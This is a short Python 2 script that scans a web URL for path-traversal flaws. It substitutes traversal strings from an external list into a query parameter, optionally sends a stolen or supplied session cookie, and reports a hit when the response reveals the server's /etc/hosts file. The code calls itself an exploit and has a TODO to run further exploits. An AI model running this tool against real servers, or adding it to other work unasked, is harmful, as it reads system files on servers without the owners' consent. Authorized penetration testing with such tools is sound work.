# -*- coding: utf-8 -*-
import os
import argparse
import sys
import requests


class path_traversal_detect:
    def __init__(self):
        self.url = ""
        self.os = 0
        self.cookie = ""

        if len(sys.argv) < 2:
            print("Path Traversal Detect")
            print("Miss Options!!!")
            print(
                "python path_traversal_detect.py -u "
                "http://demosite.com/index.php?file=123")
            print("\npython %s -h for help." % (sys.argv[0]))
            exit(0)
        else:
            parser = argparse.ArgumentParser()
            parser.add_argument("-u", "--url", dest="url",
                                help="Full link of path traversal Vuln. "
                                     "Ex: http://demosite.com/index.php?file=123",
                                action="store")
            # parser.add_argument("-o", "--os", dest="os", help="Select OS for attack. Ex: 1 is Linux or 2 is Windows",
            #                     action="store")

            parser.add_argument("-c", "--cookie", dest="cookie", help="Cookie for authenticated attack. "
                                                                      "Ex: -c 'security=low; "
                                                                      "PHPSESSID=eolqo4ngnu6dsmtoif31185dk'",
                                action="store")

            args = parser.parse_args()
            self.url = args.url if args.url else None
            # if args.os is not None or int(args.os) < 2:
            #     self.os = args.os
            if args.cookie is not None:
                self.cookie = args.cookie

    def detect(self, url_temp):
        # Check url
        if "=" in str(url_temp) and str(url_temp) != "":
            print(str(url_temp))
            # if os_temp == 0 or os_temp > 2:
            # TODO: run some exploit here
            headers = {'Cookie': str(self.cookie)}
            url_old = str(url_temp).split("=")[0]
            url_old = str(url_old) + "="
            path_temp = os.path.dirname(os.path.realpath(__file__))
            path_file = os.path.join(path_temp, "detect_path.txt")
            with open(path_file) as f:
                contents = f.read().splitlines()
            for content in contents:
                new_url = str(url_old) + str(content)
                print "Detect Vuln Derectory Traversal: " + str(new_url)
                # run exploit /etc/hosts
                try:
                    r = requests.get(url=new_url, headers=headers)
                    if r.status_code == 200:
                        data = r.content
                        data = str(data).split("<!DOCTYPE")[0]
                        if "localhost" in data or "127.0.0.1" in data:
                            print "Directory Traversal Detected!!!!"
                            return new_url
                except:
                    return "Error Detect"
                    print "Error When Extract Input!!!"
        else:
            print("This Url Hasn't Vuln!!!")
            return "Not Detect"

    def main(self):
        print("Check Url and OS!")
        self.detect(self.url)


exploit = path_traversal_detect()
exploit.main()
